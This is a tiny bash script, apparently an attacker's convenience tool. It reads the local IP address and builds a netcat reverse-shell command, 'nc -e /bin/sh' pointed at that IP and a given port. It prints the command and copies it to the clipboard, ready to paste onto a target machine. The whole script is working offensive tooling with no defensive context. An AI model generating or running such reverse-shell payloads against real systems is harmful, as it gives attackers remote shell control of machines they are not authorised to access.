#!/bin/bash
IP=$( IP_No_Clip );
New_IP=$( echo -n $IP );
echo "nc -e /bin/sh $New_IP $1";
echo "nc -e /bin/sh $New_IP $1" | clip;
